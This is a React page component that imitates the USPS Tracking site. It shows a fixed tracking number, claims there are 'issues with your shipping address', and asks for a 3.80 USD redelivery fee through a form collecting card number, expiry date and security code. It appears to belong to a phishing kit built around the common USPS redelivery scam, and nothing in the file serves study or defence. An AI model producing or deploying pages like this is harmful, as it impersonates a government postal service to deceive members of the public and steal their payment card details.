import React, { useState } from "react";
import Header from "../components/Header";
import Footer from "../components/Footer";

const Payment: React.FC = () => {
  const inputClass =
    "w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]";

  const statusSegments = [
    { id: 1, gradient: "linear-gradient(90deg, #2b2a72 0%, #1f1f5a 100%)" },
    { id: 2, color: "#d9d9df" },
    { id: 3, color: "#d9d9df" },
    { id: 4, color: "#d9d9df" },
  ];

  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  };

  const formatExpiry = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length < 3) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  };

  const formatCvv = (value: string) => value.replace(/\D/g, "").slice(0, 4);

  return (
    <div className="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
      <Header />
      <main className="flex-1 w-full">
        <div className="w-full bg-white border-b border-[#e0e0e8] py-10 px-4 sm:px-6 shadow-sm">
          <div className="max-w-[960px] mx-auto flex flex-wrap items-start justify-between gap-6">
            <div>
              <div className="text-[26px] sm:text-[30px] font-semibold text-[#1a2252] leading-tight">
                USPS Tracking<sup className="text-xs align-super">®</sup>
              </div>
              <button
                type="button"
                className="mt-3 inline-flex items-center gap-2 sm:gap-3 text-[14px] sm:text-[15px] font-semibold text-[#1a2252] hover:underline"
              >
                <span>Track Another Package</span>
                <span className="text-[#d52b1e] text-[18px] sm:text-[22px] leading-none">+</span>
              </button>
            </div>
            <div className="flex items-center gap-4 sm:gap-5 text-[14px] sm:text-[15px] font-semibold text-[#1a2252]">
              <button
                type="button"
                className="relative px-1 pb-1 text-[#1a2252] after:absolute after:left-0 after:right-0 after:bottom-0 after:h-[2px] after:bg-[#d52b1e]"
              >
                Tracking
              </button>
              <span className="h-5 w-px bg-[#d8d8e0]" />
              <button
                type="button"
                className="px-1 pb-1 text-[#4a4f6d] hover:text-[#1a2252] transition-colors"
              >
                FAQs
              </button>
            </div>
          </div>
        </div>
        <div className="w-full max-w-[960px] mx-auto px-4 sm:px-6 pb-16">
          <div className="mt-12 space-y-12">
            <section className="space-y-5">
              <div className="text-[16px] sm:text-[17px] text-[#4a4f6d]">
                <span className="font-semibold text-[#1a2252]">Tracking Number:</span>
                <span className="ml-1 sm:ml-2 font-semibold text-[16px] sm:text-[17px] text-[#6b6f88]">92612999897543581074711582</span>
              </div>
              <div className="text-[17px] font-semibold text-[#23285a]">Status :</div>
              <div className="text-[19px] font-bold text-[#c5282c]">
                We have issues with your shipping address
              </div>
              <div className="text-[14px] leading-6 text-[#4a4f6d] max-w-[620px]">
                USPS allows you to Redeliver your package to your address in case of
                delivery failure or any other case. You can also track the package at
                any time, from shipment to delivery.
              </div>
              <div className="mt-4 flex w-full max-w-[760px]">
                {statusSegments.map((segment, index) => (
                  <div
                    key={segment.id}
                    className="h-[14px]"
                    style={{
                      flexGrow: index === 0 ? 1.6 : 1,
                      flexBasis: 0,
                      background: segment.gradient || segment.color,
                      clipPath:
                        index === statusSegments.length - 1
                          ? "polygon(8px 0, 100% 0, 100% 100%, 0 100%)"
                          : "polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%)",
                      marginRight: index === statusSegments.length - 1 ? 0 : 4,
                    }}
                  />
                ))}
              </div>
              <div className="text-[13px] font-semibold text-[#c5282c] uppercase tracking-wide">
                Status Not Available
              </div>
            </section>
            <section>
              <div className="text-[17px] font-semibold text-[#23285a] mb-1">Payment Method</div>
              <div className="text-[10px] text-[#c5282c] tracking-wide mb-5">
                This redelivery request costs 3.80 USD.
              </div>
              <form className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-4 max-w-[620px]">
                <div className="sm:col-span-2">
                  <input
                    type="text"
                    inputMode="numeric"
                    placeholder="Card Number"
                    className={inputClass}
                    value={cardNumber}
                    onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                    pattern="^(\d{4} \d{4} \d{4} \d{4})$"
                    required
                  />
                </div>
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="Expiry Date (MM/YY)"
                  className={inputClass}
                  value={expiry}
                  onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                  pattern="^(0[1-9]|1[0-2])\/\d{2}$"
                  required
                />
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="Security Code"
                  className={inputClass}
                  value={cvv}
                  onChange={(e) => setCvv(formatCvv(e.target.value))}
                  pattern="^\d{3,4}$"
                  required
                />
                <button
                  type="submit"
                  className="sm:col-span-2 mt-2 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-12 py-3.5 text-[16px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors"
                >
                  Continue
                </button>
              </form>
            </section>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default Payment;
